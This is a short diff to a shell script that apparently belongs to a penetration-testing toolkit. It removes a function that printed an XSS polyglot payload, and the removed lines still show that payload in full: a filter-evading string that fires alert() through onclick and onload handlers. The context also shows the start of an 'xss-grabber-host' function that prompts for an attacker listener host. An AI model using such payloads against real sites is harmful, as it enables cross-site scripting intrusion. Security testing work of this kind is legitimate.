@@ -4,14 +4,6 @@
 # qq-enum-web-xss
 #############################################################
 
-qq-enum-web-xss-polyglot() {
-    echo "${__XSS_POLYGLOT}"
-}
-
-__XSS_POLYGLOT=$(cat << END 
-jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e
-END
-)
 
 qq-enum-web-xss-grabber-host() {
     local l && read "l?LHOST: "
